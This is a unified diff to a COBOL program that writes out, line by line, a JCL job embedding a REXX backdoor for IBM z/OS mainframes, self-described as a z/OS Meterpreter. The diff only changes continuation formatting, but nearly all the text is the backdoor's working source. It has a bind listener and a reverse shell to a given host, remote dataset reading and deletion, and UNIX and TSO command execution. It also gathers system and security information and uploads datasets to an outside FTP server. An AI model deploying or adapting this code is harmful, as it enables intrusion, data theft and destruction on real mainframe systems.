@@ -27,7 +27,7 @@
            MOVE '//CATSOJO  JOB ''CATSO''' TO WS-LINE(1)
            MOVE '//DEL0010  EXEC PGM=IEFBR14' TO WS-LINE(2)
            MOVE '//DSN2DEL  DD   DSN=DOGE.CATSO,DISP=(MOD,DELETE),'
-      -     TO WS-LINE(3)
+            TO WS-LINE(3)
            MOVE '//         SPACE=(CYL,0)' TO WS-LINE(4)
            MOVE '//         EXEC PGM=IEBGENER' TO WS-LINE(5)
            MOVE '//SYSIN    DD DUMMY' TO WS-LINE(6)
@@ -159,10 +159,10 @@
       -    '~~~~~~~~~~~~~ */' TO WS-LINE(70)
            MOVE ' ' TO WS-LINE(71)
            MOVE '/* Uncomment this line to turn on debugging */'
-      -     TO WS-LINE(72)
+            TO WS-LINE(72)
            MOVE '/* TRACE I */' TO WS-LINE(73)
            MOVE '/* change verbose to 1 to see results on the screen */'
-      -     TO WS-LINE(74)
+            TO WS-LINE(74)
            MOVE 'verbose = 0' TO WS-LINE(75)
            MOVE ' ' TO WS-LINE(76)
            MOVE 'if verbose then say ''''' TO WS-LINE(77)
@@ -175,7 +175,7 @@
            MOVE 'PARSE ARG type arghost argport' TO WS-LINE(83)
            MOVE ' ' TO WS-LINE(84)
            MOVE '/* Parse the arguments to see what we want to do */'
-      -     TO WS-LINE(85)
+            TO WS-LINE(85)
            MOVE 'SELECT' TO WS-LINE(86)
            MOVE 'WHEN type = ''L'' THEN' TO WS-LINE(87)
            MOVE 'DO' TO WS-LINE(88)
@@ -184,17 +184,17 @@
            MOVE '     if verbose then say "[+] You specified Listener wi
       -    'thout a port."' TO WS-LINE(91)
            MOVE '     if verbose then say "Using default: 12345"'
-      -     TO WS-LINE(92)
+            TO WS-LINE(92)
            MOVE '     arghost = 12345' TO WS-LINE(93)
            MOVE '   END' TO WS-LINE(94)
            MOVE 'if verbose then say ''[+] Listening on port:'' arghost'
-      -     TO WS-LINE(95)
+            TO WS-LINE(95)
            MOVE 'party = MATT_DAEMON(arghost)' TO WS-LINE(96)
            MOVE 'END' TO WS-LINE(97)
            MOVE 'WHEN type = ''R'' THEN' TO WS-LINE(98)
            MOVE 'DO' TO WS-LINE(99)
            MOVE '  IF arghost = '''' | argport = '''' THEN'
-      -     TO WS-LINE(100)
+            TO WS-LINE(100)
            MOVE '  DO' TO WS-LINE(101)
            MOVE '   SAY ''[!] You must pass a host and port when using R
       -    'everse''' TO WS-LINE(102)
@@ -217,12 +217,12 @@
            MOVE 'END /* End the arguments parser */' TO WS-LINE(114)
            MOVE ' ' TO WS-LINE(115)
            MOVE 'MATT_DAEMON: /* Starts the listener mode */'
-      -     TO WS-LINE(116)
+            TO WS-LINE(116)
            MOVE '    parse arg port' TO WS-LINE(117)
            MOVE '    terp = SOCKET(''INITIALIZE'',''DAEMON'',2)'
-      -     TO WS-LINE(118)
+            TO WS-LINE(118)
            MOVE '    /* terp is short for z-terpreter */'
-      -     TO WS-LINE(119)
+            TO WS-LINE(119)
            MOVE '    parse var terp terp_rc .' TO WS-LINE(120)
            MOVE '    IF terp_rc <> 0 THEN' TO WS-LINE(121)
            MOVE '    DO' TO WS-LINE(122)
@@ -237,7 +237,7 @@
            MOVE '    /* setup the socket */' TO WS-LINE(130)
            MOVE '    terp = SOCKET(''SOCKET'')' TO WS-LINE(131)
            MOVE '    parse var terp socket_rc socketID .'
-      -     TO WS-LINE(132)
+            TO WS-LINE(132)
            MOVE '    if socket_rc <> 0 then' TO WS-LINE(133)
            MOVE '    DO' TO WS-LINE(134)
            MOVE '      if verbose then say "[!] Socket FAILED with info:
@@ -262,21 +262,21 @@
            MOVE '    if connect_rc <> 0 then' TO WS-LINE(147)
            MOVE '    DO' TO WS-LINE(148)
            MOVE '      if verbose then say "[!] Bind Failed:" terp'
-      -     TO WS-LINE(149)
+            TO WS-LINE(149)
            MOVE '      CALL DAVID_COULIER(1)' TO WS-LINE(150)
            MOVE '    END' TO WS-LINE(151)
            MOVE '    if verbose then say "[!] IP" MF_IP "and Port" port
       -    '"opened"' TO WS-LINE(152)
            MOVE '    terp = Socket(''Listen'',socketID,2)'
-      -     TO WS-LINE(153)
+            TO WS-LINE(153)
            MOVE '    parse var terp src .' TO WS-LINE(154)
            MOVE '    if src > 0 then DAVID_COULIER(1)' TO WS-LINE(155)
            MOVE '    if verbose then say ''[+] Server Ready'''
-      -     TO WS-LINE(156)
+            TO WS-LINE(156)
            MOVE ' ' TO WS-LINE(157)
            MOVE '    clients = ''''' TO WS-LINE(158)
            MOVE '   DO FOREVER /* Like, forever forever? A: Yes. */'
-      -     TO WS-LINE(159)
+            TO WS-LINE(159)
            MOVE '    terp = Socket(''Select'',''READ'' socketID clients
       -    '''WRITE'' ''EXCEPTION'')' TO WS-LINE(160)
            MOVE 'parse upper var terp ''READ'' readin ''WRITE'' writtin
@@ -286,19 +286,19 @@
       -    ' new socket */' TO WS-LINE(163)
            MOVE '    DO' TO WS-LINE(164)
            MOVE '     terp = Socket(''Accept'',socketID)'
-      -     TO WS-LINE(165)
+            TO WS-LINE(165)
            MOVE '     parse var terp src hackerID . hport hip'
-      -     TO WS-LINE(166)
+            TO WS-LINE(166)
            MOVE '     if verbose then say "[!] Connection from "||hip||"
       -    ':"||hport' TO WS-LINE(167)
            MOVE '     clients = hackerID' TO WS-LINE(168)
            MOVE '     if verbose then say ''[+] Hacker socket ID'' clien
       -    'ts' TO WS-LINE(169)
            MOVE '     terp = Socket(''Socketsetstatus'')'
-      -     TO WS-LINE(170)
+            TO WS-LINE(170)
            MOVE '     parse var terp src . status' TO WS-LINE(171)
            MOVE '     if verbose then say ''[+] Current Status'' status'
-      -     TO WS-LINE(172)
+            TO WS-LINE(172)
            MOVE '     terp = Socket(''Setsockopt'',hackerID,''SOL_SOCKET
       -    ''',''SO_ASCII'',''ON'')' TO WS-LINE(173)
            MOVE '     terp = Socket(''Ioctl'',hackerID,''FIONBIO'',''ON'
@@ -313,7 +313,7 @@
            MOVE '    if readin = hackerID THEN' TO WS-LINE(179)
            MOVE '    DO' TO WS-LINE(180)
            MOVE '     ARNOLD = commando(hackerID) /* get the command */'
-      -     TO WS-LINE(181)
+            TO WS-LINE(181)
            MOVE '     if verbose then say "[+] Commands received: "||ARN
       -    'OLD' TO WS-LINE(182)
            MOVE '     parse = CHOPPA(hackerID,ARNOLD) /* Get the cmd to
@@ -327,13 +327,13 @@
       -    ' got it! */' TO WS-LINE(189)
            MOVE 'PARSE ARG rhost,  rport' TO WS-LINE(190)
            MOVE '    terp = SOCKET(''INITIALIZE'',''CLIENT'',2)'
-      -     TO WS-LINE(191)
+            TO WS-LINE(191)
            MOVE '    /* terp is short for z-terpreter */'
-      -     TO WS-LINE(192)
+            TO WS-LINE(192)
            MOVE '    terp = SOCKET(''SOCKET'',2,''STREAM'',''TCP'')'
-      -     TO WS-LINE(193)
+            TO WS-LINE(193)
            MOVE '    parse var terp socket_rc socketID .'
-      -     TO WS-LINE(194)
+            TO WS-LINE(194)
            MOVE '    if socket_rc <> 0 then' TO WS-LINE(195)
            MOVE '    do' TO WS-LINE(196)
            MOVE '       if verbose then say "[!] Socket FAILED with info
@@ -355,9 +355,9 @@
            MOVE '      exit 1' TO WS-LINE(208)
            MOVE '    end' TO WS-LINE(209)
            MOVE '    terp = SOCKET(''SOCKETSETSTATUS'',''CLIENT'')'
-      -     TO WS-LINE(210)
+            TO WS-LINE(210)
            MOVE '    if verbose then say "[+] Socket Status is" terp'
-      -     TO WS-LINE(211)
+            TO WS-LINE(211)
            MOVE '    terp = SOCKET(''CONNECT'',socketID,''AF_INET'' rpor
       -    't rhost)' TO WS-LINE(212)
            MOVE '    parse var terp connect_rc rest' TO WS-LINE(213)
@@ -370,12 +370,12 @@
            MOVE '    if verbose then say "[!] Connection Established to"
       -    ',' TO WS-LINE(219)
            MOVE '                        rhost||":"||rport'
-      -     TO WS-LINE(220)
+            TO WS-LINE(220)
            MOVE '    terp = SOCKET(''SEND'',socketID, "Enter command or
       -    '''help''> ")' TO WS-LINE(221)
            MOVE ' ' TO WS-LINE(222)
            MOVE '    DO FOREVER /* The never end storyyyyy */'
-      -     TO WS-LINE(223)
+            TO WS-LINE(223)
            MOVE '      ARNOLD = commando(socketID) /* get the command */
       -    '' TO WS-LINE(224)
            MOVE '      if verbose then say "[+] Commands received: "||AR
@@ -395,20 +395,20 @@
            MOVE 'parse arg sockID, do_it' TO WS-LINE(237)
            MOVE 'parse var do_it do_it do_commands' TO WS-LINE(238)
            MOVE '/* We have our socket and commands not lets do this */'
-      -     TO WS-LINE(239)
+            TO WS-LINE(239)
            MOVE '    SELECT' TO WS-LINE(240)
            MOVE '        WHEN do_it = ''sysinfo'' THEN' TO WS-LINE(241)
            MOVE '        DO' TO WS-LINE(242)
            MOVE '          send_it = GET_OS_INFO()' TO WS-LINE(243)
            MOVE '          if verbose then say ''[!] Sending OS Info'''
-      -     TO WS-LINE(244)
+            TO WS-LINE(244)
            MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
       -    'NE)' TO WS-LINE(245)
            MOVE '        END' TO WS-LINE(246)
            MOVE '        WHEN do_it = ''cat'' THEN' TO WS-LINE(247)
            MOVE '        DO' TO WS-LINE(248)
            MOVE '          send_it = CAT_FILE(do_commands)'
-      -     TO WS-LINE(249)
+            TO WS-LINE(249)
            MOVE '          if verbose then say ''[!] Catting file'' do_c
       -    'ommands' TO WS-LINE(250)
            MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
@@ -427,7 +427,7 @@
            MOVE '        WHEN do_it = ''pwd'' THEN' TO WS-LINE(260)
            MOVE '        DO' TO WS-LINE(261)
            MOVE '          send_it = NEWLINE||UPPER(pwd)||NEWLINE'
-      -     TO WS-LINE(262)
+            TO WS-LINE(262)
            MOVE '          if verbose then say ''[!] Sending PWD of:'' p
       -    'wd' TO WS-LINE(263)
            MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
@@ -439,7 +439,7 @@
            MOVE '            send_it = LS(sockID,pwd)' TO WS-LINE(269)
            MOVE '          ELSE' TO WS-LINE(270)
            MOVE '            send_it = LS(sockID,do_commands)'
-      -     TO WS-LINE(271)
+            TO WS-LINE(271)
            MOVE '          if verbose then say ''[!] Sending LS COMMAND'
       -    ''' TO WS-LINE(272)
            MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
@@ -454,10 +454,10 @@
       -    'NE)' TO WS-LINE(279)
            MOVE '        END' TO WS-LINE(280)
            MOVE '        WHEN do_it = ''del'' | do_it = ''delete'' THEN'
-      -     TO WS-LINE(281)
+            TO WS-LINE(281)
            MOVE '        DO' TO WS-LINE(282)
            MOVE '          send_it = DELETE(do_commands)'
-      -     TO WS-LINE(283)
+            TO WS-LINE(283)
            MOVE '          if verbose then say ''[!] Deleting'' do_comma
       -    'nds' TO WS-LINE(284)
            MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
@@ -467,7 +467,7 @@
            MOVE '        WHEN do_it = ''unix'' THEN' TO WS-LINE(288)
            MOVE '        DO' TO WS-LINE(289)
            MOVE '          send_it = UNIX_COMMAND(do_commands)'
-      -     TO WS-LINE(290)
+            TO WS-LINE(290)
            MOVE '          if verbose then say ''[!] Sending UNIX COMMAN
       -    'D''' TO WS-LINE(291)
            MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
@@ -477,7 +477,7 @@
       -    '' TO WS-LINE(294)
            MOVE '        DO' TO WS-LINE(295)
            MOVE '          send_it = TSO_COMMAND(do_commands)'
-      -     TO WS-LINE(296)
+            TO WS-LINE(296)
            MOVE '          if verbose then say ''[!] Executing TSO Comma
       -    'nd'' do_commands' TO WS-LINE(297)
            MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
@@ -486,7 +486,7 @@
            MOVE '        WHEN do_it = ''ftp'' THEN' TO WS-LINE(300)
            MOVE '        DO' TO WS-LINE(301)
            MOVE '          send_it = UPLOAD_FILE(do_commands)'
-      -     TO WS-LINE(302)
+            TO WS-LINE(302)
            MOVE '          if verbose then say ''[!] Using FTP to upload
       -    ' to'' do_commands' TO WS-LINE(303)
            MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
@@ -496,7 +496,7 @@
            MOVE '        DO' TO WS-LINE(307)
            MOVE '          send_it = GET_UID()' TO WS-LINE(308)
            MOVE '          if verbose then say ''[!] Sending UID'''
-      -     TO WS-LINE(309)
+            TO WS-LINE(309)
            MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
       -    'NE)' TO WS-LINE(310)
            MOVE '        END' TO WS-LINE(311)
@@ -506,9 +506,9 @@
            MOVE '            send_it = LS_MEMBERS(pwd)' TO WS-LINE(315)
            MOVE '          ELSE' TO WS-LINE(316)
            MOVE '            send_it = LS_MEMBERS(do_commands)'
-      -     TO WS-LINE(317)
+            TO WS-LINE(317)
            MOVE '          if verbose then say ''[!] Sending Members'''
-      -     TO WS-LINE(318)
+            TO WS-LINE(318)
            MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
       -    'NE)' TO WS-LINE(319)
            MOVE '        END' TO WS-LINE(320)
@@ -517,7 +517,7 @@
            MOVE '        DO' TO WS-LINE(322)
            MOVE '          send_it = GET_IP_INFO()' TO WS-LINE(323)
            MOVE '          if verbose then say ''[!] Sending IP Info'''
-      -     TO WS-LINE(324)
+            TO WS-LINE(324)
            MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
       -    'NE)' TO WS-LINE(325)
            MOVE '        END' TO WS-LINE(326)
@@ -533,20 +533,20 @@
            MOVE '        DO' TO WS-LINE(334)
            MOVE '          send_it = GET_HELP()' TO WS-LINE(335)
            MOVE '          if verbose then say ''[!] Sending Help'''
-      -     TO WS-LINE(336)
+            TO WS-LINE(336)
            MOVE '          terp = SOCKET(''SEND'',sockID, send_it||NEWLI
       -    'NE)' TO WS-LINE(337)
            MOVE '        END' TO WS-LINE(338)
            MOVE '        WHEN do_it = ''quit'' | do_it = ''exit'' THEN'
-      -     TO WS-LINE(339)
+            TO WS-LINE(339)
            MOVE '        DO' TO WS-LINE(340)
            MOVE '          if verbose then say ''[!] POP POP!'''
-      -     TO WS-LINE(341)
+            TO WS-LINE(341)
            MOVE '          CALL DAVID_COULIER(0) /* jackalope */'
-      -     TO WS-LINE(342)
+            TO WS-LINE(342)
            MOVE '     END' TO WS-LINE(343)
            MOVE '     OTHERWISE /* The end of our options */'
-      -     TO WS-LINE(344)
+            TO WS-LINE(344)
            MOVE '         if verbose then say ''[!] Unrecognized Command
       -    '''' TO WS-LINE(345)
            MOVE '    END /* End the select section */' TO WS-LINE(346)
@@ -571,15 +571,15 @@
            MOVE '/* get commands */' TO WS-LINE(364)
            MOVE '     choppa = ''''' TO WS-LINE(365)
            MOVE '     sox = SOCKET(''RECV'',socket_to_use,10000)'
-      -     TO WS-LINE(366)
+            TO WS-LINE(366)
            MOVE '     parse var sox s_rc s_type s_port s_ip s_results'
-      -     TO WS-LINE(367)
+            TO WS-LINE(367)
            MOVE '     parse var sox s_rc s_data_len s_data_text'
-      -     TO WS-LINE(368)
+            TO WS-LINE(368)
            MOVE '     if s_rc <> 0 then' TO WS-LINE(369)
            MOVE '     do' TO WS-LINE(370)
            MOVE '        if verbose then say "[!] Couldn''t get data"'
-      -     TO WS-LINE(371)
+            TO WS-LINE(371)
            MOVE '        CALL DAVID_COULIER(1)' TO WS-LINE(372)
            MOVE '     end' TO WS-LINE(373)
            MOVE '     /* Strip off the last byte cause it''s all weird *
@@ -601,9 +601,9 @@
            MOVE '   x = OUTTRAP(''var.'')' TO WS-LINE(386)
            MOVE '   address tso  "NETSTAT HOME"' TO WS-LINE(387)
            MOVE '   parse var var.1 a1 a2 a3 a4 a5 a6 a7 a8 type .'
-      -     TO WS-LINE(388)
+            TO WS-LINE(388)
            MOVE '   text = NEWLINE||"TCP/IP Name:" type||NEWLINE'
-      -     TO WS-LINE(389)
+            TO WS-LINE(389)
            MOVE '   IPADDR = SOCKET(''GETHOSTID'')' TO WS-LINE(390)
            MOVE '   parse var IPADDR ip_rc ip_addr' TO WS-LINE(391)
            MOVE '  text = text||"Connected using IP Address: "||ip_addr|
@@ -611,16 +611,16 @@
            MOVE '   j = 1' TO WS-LINE(393)
            MOVE '   DO i = 5 TO var.0' TO WS-LINE(394)
            MOVE '       parse var var.i garbage ip_addr link flag_sp'
-      -     TO WS-LINE(395)
+            TO WS-LINE(395)
            MOVE '       flag = SPACE(flag_sp,0)' TO WS-LINE(396)
            MOVE '       text = text||"Interface "||j||NEWLINE||"========
       -    '=="||NEWLINE,' TO WS-LINE(397)
            MOVE '       "Name         : "||link||NEWLINE,'
-      -     TO WS-LINE(398)
+            TO WS-LINE(398)
            MOVE '       "IPv4 Address : "||ip_addr||NEWLINE,'
-      -     TO WS-LINE(399)
+            TO WS-LINE(399)
            MOVE '       "Flag         : "||flag||NEWLINE||NEWLINE'
-      -     TO WS-LINE(400)
+            TO WS-LINE(400)
            MOVE '       j = j + 1' TO WS-LINE(401)
            MOVE '   end' TO WS-LINE(402)
            MOVE '   x = OUTTRAP(OFF)' TO WS-LINE(403)
@@ -646,9 +646,9 @@
       -    'LINE' TO WS-LINE(418)
            MOVE ' ' TO WS-LINE(419)
            MOVE '     text = text||" Active    : "||active1||NEWLINE,'
-      -     TO WS-LINE(420)
+            TO WS-LINE(420)
            MOVE '            "FileName  : "||dataset1||NEWLINE||NEWLINE'
-      -     TO WS-LINE(421)
+            TO WS-LINE(421)
            MOVE '   if use2 = ''PRIM'' then' TO WS-LINE(422)
            MOVE '     text = text||"Primary"||NEWLINE||"========"||NEWLI
       -    'NE' TO WS-LINE(423)
@@ -657,19 +657,19 @@
       -    'E' TO WS-LINE(425)
            MOVE ' ' TO WS-LINE(426)
            MOVE '     text = text||" Active    : "||active2||NEWLINE,'
-      -     TO WS-LINE(427)
+            TO WS-LINE(427)
            MOVE '                  "Filename  : "||dataset2||NEWLINE'
-      -     TO WS-LINE(428)
+            TO WS-LINE(428)
            MOVE '   x = OUTTRAP(OFF)' TO WS-LINE(429)
            MOVE '   return text' TO WS-LINE(430)
            MOVE ' ' TO WS-LINE(431)
            MOVE 'UNIX_COMMAND:' TO WS-LINE(432)
            MOVE '/* Executes a UNIX command (aka OMVS) */'
-      -     TO WS-LINE(433)
+            TO WS-LINE(433)
            MOVE '    parse arg unix_command' TO WS-LINE(434)
            MOVE '    CALL BPXWUNIX unix_command,,out.' TO WS-LINE(435)
            MOVE '    text = ''''||NEWLINE /* blank out text */'
-      -     TO WS-LINE(436)
+            TO WS-LINE(436)
            MOVE '    DO i = 1 TO out.0' TO WS-LINE(437)
            MOVE '       text = text||out.i||NEWLINE' TO WS-LINE(438)
            MOVE '    END' TO WS-LINE(439)
@@ -677,7 +677,7 @@
            MOVE ' ' TO WS-LINE(441)
            MOVE 'TSO_COMMAND:' TO WS-LINE(442)
            MOVE '/* outputs the results of a TSO command */'
-      -     TO WS-LINE(443)
+            TO WS-LINE(443)
            MOVE '   parse arg tso_do' TO WS-LINE(444)
            MOVE '   text = NEWLINE||"Issuing TSO Command: "||tso_do||NEW
       -    'LINE' TO WS-LINE(445)
@@ -691,44 +691,44 @@
            MOVE ' ' TO WS-LINE(453)
            MOVE 'GET_OS_INFO:' TO WS-LINE(454)
            MOVE '/* z/OS Operating System Information */'
-      -     TO WS-LINE(455)
+            TO WS-LINE(455)
            MOVE '/* Lots of help from the LPINFO script from */'
-      -     TO WS-LINE(456)
+            TO WS-LINE(456)
            MOVE '/* www.longpelaexpertise.com.au */' TO WS-LINE(457)
            MOVE '   cvtaddr = get_dec_addr(16)' TO WS-LINE(458)
            MOVE '   zos_name = Strip(Storage(D2x(cvtaddr+340),8))'
-      -     TO WS-LINE(459)
+            TO WS-LINE(459)
            MOVE '   ecvtaddr = get_dec_addr(cvtaddr+140)'
-      -     TO WS-LINE(460)
+            TO WS-LINE(460)
            MOVE '   zos_ver = Strip(Storage(D2x(ecvtaddr+512),2))'
-      -     TO WS-LINE(461)
+            TO WS-LINE(461)
            MOVE '   zos_rel = Strip(Storage(D2x(ecvtaddr+514),2))'
-      -     TO WS-LINE(462)
+            TO WS-LINE(462)
            MOVE '   sysplex = Strip(Storage(D2x(ecvtaddr+8),8))'
-      -     TO WS-LINE(463)
+            TO WS-LINE(463)
            MOVE '   jes_p = SYSVAR(''SYSJES'')' TO WS-LINE(464)
            MOVE '   parse var jes_p jes .' TO WS-LINE(465)
            MOVE '   jes_node = jes||'' (Node: ''|| SYSVAR(''SYSNODE'')||
       -    ''')''' TO WS-LINE(466)
            MOVE '   security_node = get_security_system(cvtaddr+992)'
-      -     TO WS-LINE(467)
+            TO WS-LINE(467)
            MOVE '   text = NEWLINE,' TO WS-LINE(468)
            MOVE '       "Computer    : LPAR "|| zos_name||NEWLINE,'
-      -     TO WS-LINE(469)
+            TO WS-LINE(469)
            MOVE '       "Sysplex     : "||sysplex||NEWLINE,'
-      -     TO WS-LINE(470)
+            TO WS-LINE(470)
            MOVE '       "OS          : z/OS" zos_ver||.||zos_rel||NEWLIN
       -    'E,' TO WS-LINE(471)
            MOVE '       "Job Entry   : "||jes_node||NEWLINE,'
-      -     TO WS-LINE(472)
+            TO WS-LINE(472)
            MOVE '       "Security    : "||security_node||NEWLINE,'
-      -     TO WS-LINE(473)
+            TO WS-LINE(473)
            MOVE '       "Meterpreter : z/OS REXX"||NEWLINE'
-      -     TO WS-LINE(474)
+            TO WS-LINE(474)
            MOVE '   return text' TO WS-LINE(475)
            MOVE ' ' TO WS-LINE(476)
            MOVE 'get_dec_addr: /* Needed for GET_OS_INFO */'
-      -     TO WS-LINE(477)
+            TO WS-LINE(477)
            MOVE '     parse arg addr' TO WS-LINE(478)
            MOVE '     hex_addr = d2x(addr)' TO WS-LINE(479)
            MOVE '     stor = Storage(hex_addr,4)' TO WS-LINE(480)
@@ -736,32 +736,32 @@
            MOVE '     value = x2d(hex_stor)' TO WS-LINE(482)
            MOVE '  return value' TO WS-LINE(483)
            MOVE 'get_security_system:  /* needed for GET_OS_INFO */'
-      -     TO WS-LINE(484)
+            TO WS-LINE(484)
            MOVE '     parse arg sec_addr' TO WS-LINE(485)
            MOVE '     cvtrac = get_dec_addr(sec_addr)' TO WS-LINE(486)
            MOVE '     rcvtid = Storage(d2x(cvtrac),4)' TO WS-LINE(487)
            MOVE '     if rcvtid = ''RCVT'' then return ''RACF'''
-      -     TO WS-LINE(488)
+            TO WS-LINE(488)
            MOVE '     if rcvtid = ''RTSS'' then return ''CA Top Secret''
       -    '' TO WS-LINE(489)
            MOVE '     if rcvtid = ''ACF2'' then return ''CA ACF2'''
-      -     TO WS-LINE(490)
+            TO WS-LINE(490)
            MOVE '   return 0' TO WS-LINE(491)
            MOVE ' ' TO WS-LINE(492)
            MOVE 'CAT_FILE:' TO WS-LINE(493)
            MOVE '/* Cats a file and returns it to the screen */'
-      -     TO WS-LINE(494)
+            TO WS-LINE(494)
            MOVE '  parse arg meow .' TO WS-LINE(495)
            MOVE '  cat = STRIP(meow)' TO WS-LINE(496)
            MOVE '  ADDRESS TSO "ALLOC F(intemp) DSN(''"||cat||"'') SHR"'
-      -     TO WS-LINE(497)
+            TO WS-LINE(497)
            MOVE '  ADDRESS TSO "EXECIO * DISKR intemp (FINIS STEM TIGER.
       -    '"' TO WS-LINE(498)
            MOVE '  ADDRESS TSO "free file(intemp)"' TO WS-LINE(499)
            MOVE '  text = NEWLINE||''File: ''||meow||NEWLINE'
-      -     TO WS-LINE(500)
+            TO WS-LINE(500)
            MOVE '  text = text||''File Length: ''||TIGER.0||NEWLINE'
-      -     TO WS-LINE(501)
+            TO WS-LINE(501)
            MOVE '  DO i = 1 TO TIGER.0' TO WS-LINE(502)
            MOVE '      text = text||TIGER.i||NEWLINE' TO WS-LINE(503)
            MOVE ' ' TO WS-LINE(504)
@@ -769,28 +769,28 @@
            MOVE ' return text' TO WS-LINE(506)
            MOVE ' ' TO WS-LINE(507)
            MOVE 'CP: /* Uses a JCL to copy one file to the other */'
-      -     TO WS-LINE(508)
+            TO WS-LINE(508)
            MOVE '    parse arg from_DS to_DS' TO WS-LINE(509)
            MOVE '    IF to_DS = '''' THEN' TO WS-LINE(510)
            MOVE '    DO' TO WS-LINE(511)
            MOVE '      text = NEWLINE||"cp command requires a to and a f
       -    'rom.",' TO WS-LINE(512)
            MOVE '             "You only supplied: "||from_DS||NEWLINE'
-      -     TO WS-LINE(513)
+            TO WS-LINE(513)
            MOVE '      return text' TO WS-LINE(514)
            MOVE '    END' TO WS-LINE(515)
            MOVE '    DROPBUF 0' TO WS-LINE(516)
            MOVE '    queue "//CPTHATS EXEC PGM=IEBGENER"'
-      -     TO WS-LINE(517)
+            TO WS-LINE(517)
            MOVE '    queue "//SYSPRINT DD SYSOUT=*"' TO WS-LINE(518)
            MOVE '    queue "//SYSIN    DD DUMMY"' TO WS-LINE(519)
            MOVE '    queue "//SYSUT1   DD DSN="||from_DS||",DISP=SHR"'
-      -     TO WS-LINE(520)
+            TO WS-LINE(520)
            MOVE '    queue "//SYSUT2   DD DSN="||to_DS||","'
-      -     TO WS-LINE(521)
+            TO WS-LINE(521)
            MOVE '    queue "//     LIKE="||from_DS||","' TO WS-LINE(522)
            MOVE '    queue "//     DISP=(NEW,CATLG,DELETE),"'
-      -     TO WS-LINE(523)
+            TO WS-LINE(523)
            MOVE '    queue "//     UNIT=SYSDA"' TO WS-LINE(524)
            MOVE '    queue "/*"' TO WS-LINE(525)
            MOVE '    queue "@#"' TO WS-LINE(526)
@@ -803,7 +803,7 @@
            MOVE ' ' TO WS-LINE(532)
            MOVE 'DELETE:' TO WS-LINE(533)
            MOVE '    /* Deletes a file or dataset member */'
-      -     TO WS-LINE(534)
+            TO WS-LINE(534)
            MOVE '    parse arg deleteme .' TO WS-LINE(535)
            MOVE '    IF deleteme = '''' THEN' TO WS-LINE(536)
            MOVE '    DO' TO WS-LINE(537)
@@ -813,7 +813,7 @@
            MOVE '    END' TO WS-LINE(540)
            MOVE '    d = OUTTRAP(''tdel.'')' TO WS-LINE(541)
            MOVE '    ADDRESS TSO "DELETE ''"||deleteme||"''"'
-      -     TO WS-LINE(542)
+            TO WS-LINE(542)
            MOVE '    /* if you don''t put '''' around a dataset it prepe
       -    'nds your userid */' TO WS-LINE(543)
            MOVE '    d = OUTTRAP(OFF)' TO WS-LINE(544)
@@ -827,7 +827,7 @@
            MOVE '/* Uploads a file from the mainframe to an FTP server *
       -    '/' TO WS-LINE(552)
            MOVE '/* It submits a JOB which uploads the file */'
-      -     TO WS-LINE(553)
+            TO WS-LINE(553)
            MOVE '/* FYI this doesn''t always work with a debian FTP serv
       -    'er */' TO WS-LINE(554)
            MOVE '    parse arg ftp_server username password dataset bina
@@ -842,7 +842,7 @@
            MOVE '    queue username' TO WS-LINE(562)
            MOVE '    queue password' TO WS-LINE(563)
            MOVE '    if binary = "binary" then queue put "binary"'
-      -     TO WS-LINE(564)
+            TO WS-LINE(564)
            MOVE '    queue "put ''"||dataset||"''"' TO WS-LINE(565)
            MOVE '    queue "quit "' TO WS-LINE(566)
            MOVE '    queue "/*"' TO WS-LINE(567)
@@ -851,10 +851,10 @@
            MOVE '    text = NEWLINE||"Uploading file "||dataset||" to "|
       -    '|ftp_server,' TO WS-LINE(570)
            MOVE '           "using user name"||username||"."'
-      -     TO WS-LINE(571)
+            TO WS-LINE(571)
            MOVE '    if binary = "binary" then' TO WS-LINE(572)
            MOVE '        text = text||" Using Binary transfer mode."'
-      -     TO WS-LINE(573)
+            TO WS-LINE(573)
            MOVE '    else' TO WS-LINE(574)
            MOVE '        text = text||" Not using Binary transfer mode."
       -    '' TO WS-LINE(575)
@@ -866,24 +866,24 @@
            MOVE '    parse arg suckit, hilevel .' TO WS-LINE(580)
            MOVE '    filez = STRIP(hilevel)' TO WS-LINE(581)
            MOVE '    IF filez = '''' then filez = USERID()'
-      -     TO WS-LINE(582)
+            TO WS-LINE(582)
            MOVE '    hedr = NEWLINE||" Listing Files: " filez||".*"||NEW
       -    'LINE,' TO WS-LINE(583)
            MOVE '           "========================================="|
       -    '|NEWLINE' TO WS-LINE(584)
            MOVE '    terp = SOCKET(''SEND'',suckit, hedr)'
-      -     TO WS-LINE(585)
+            TO WS-LINE(585)
            MOVE '    text = NEWLINE' TO WS-LINE(586)
            MOVE '    b = OUTTRAP(''ls_cmd.'')' TO WS-LINE(587)
            MOVE '    ADDRESS TSO "LISTC LEVEL("||filez||")"'
-      -     TO WS-LINE(588)
+            TO WS-LINE(588)
            MOVE '    b = OUTTRAP(OFF)' TO WS-LINE(589)
            MOVE '    filed = 1' TO WS-LINE(590)
            MOVE '    DO i = 1 to ls_cmd.0' TO WS-LINE(591)
            MOVE '       IF filed THEN' TO WS-LINE(592)
            MOVE '        DO' TO WS-LINE(593)
            MOVE '          text = text||ls_cmd.i||NEWLINE'
-      -     TO WS-LINE(594)
+            TO WS-LINE(594)
            MOVE '          filed = 0' TO WS-LINE(595)
            MOVE '        END' TO WS-LINE(596)
            MOVE '       ELSE' TO WS-LINE(597)
@@ -899,7 +899,7 @@
            MOVE '    text = NEWLINE' TO WS-LINE(606)
            MOVE '    x = OUTTRAP(''members.'')' TO WS-LINE(607)
            MOVE '    ADDRESS TSO "LISTDS ''"||hilevelmem||"'' members"'
-      -     TO WS-LINE(608)
+            TO WS-LINE(608)
            MOVE '    x = OUTTRAP(OFF)' TO WS-LINE(609)
            MOVE '    DO i = 7 TO members.0' TO WS-LINE(610)
            MOVE '       members.i = STRIP(members.i)' TO WS-LINE(611)
@@ -919,13 +919,13 @@
            MOVE '       help = NEWLINE,' TO WS-LINE(623)
